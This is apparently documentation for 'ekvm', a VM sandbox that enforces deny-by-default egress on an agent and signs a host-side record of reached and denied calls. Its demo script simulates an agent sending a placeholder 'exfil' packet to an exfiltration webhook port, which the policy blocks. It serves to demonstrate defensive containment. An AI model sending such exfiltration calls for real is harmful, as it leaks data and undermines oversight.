# Contain an agent, and prove what it did

An untrusted agent or dynamic script may invoke tools or phone home. The engine enforces
deny-by-default egress at the VM's tap and produces an out-of-guest record of what the host permitted
and what it dropped.

The interesting property here is not that the exfiltration is blocked. It is that **the guest's own
account of the run and the host's record disagree**, and the host's is the one that is signed.

## An agent that phones home

Two UDP calls: one to a search index (`10.200.0.1:9000`), one to an exfiltration webhook
(`10.200.0.1:9100`). Only the first is allowed.

```console
ekvm run --net \
    --allow 10.200.0.1:9000/udp \
    --record record.json \
    --record-summary summary.json \
    -- python3 -c '
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b"search", ("10.200.0.1", 9000))
s.sendto(b"exfil", ("10.200.0.1", 9100))
print("both calls sent")
'
```

## What the record shows

The guest transcript reports both calls as sent, because from inside the VM `sendto` on a UDP socket
succeeds locally either way. `summary.json` carries what the host actually observed at the tap:

```json
{
  "network": {
    "reached":   ["10.200.0.1:9000/udp"],
    "denied":    ["10.200.0.1:9100/udp"],
    "allowed":   ["10.200.0.1/32:9000/udp"],
    "routed":    false,
    "enforcing": true
  }
}
```

`reached` and `denied` are both backward-looking, so an agent planning its next turn cannot tell an
endpoint it may retry from one it may not. `allowed` is what the classifier actually holds (read back
from the kernel, not restated from the request), `enforcing` says the policy was armed rather than
observed, and `routed` says whether the run had a default route at all: `false` here, so nothing off
the /30 was reachable no matter what the allow-list named.

`ekvm verify record.json` checks the host signature.
[`ekvm verify`](./cli-commands.md#ekvm-verify) states exactly what that does and does not prove: it
detects alteration after the producing host, and it does not prove a compromised host signed the
truth.

## A scripted agent to try it with

[`docs/examples/agent-tool-loop.py`](./examples/agent-tool-loop.py) is a scripted agent tool loop with
no model and no secrets, written for exactly this demonstration. The privileged test
`scripted_agent_is_contained_and_the_record_shows_reached_vs_blocked` runs that same file and asserts
the reached-versus-blocked split, so the example and the test exercise one artifact rather than two
that can drift.

Enforcement does **not** fail open. `--allow` on a host that cannot load the probes is a typed
refusal, never a run that quietly ignores the policy, because silently not enforcing a security
control is the worst available outcome. See
[Enforcing egress](./cli-observe.md#enforcing-egress-with---allow).
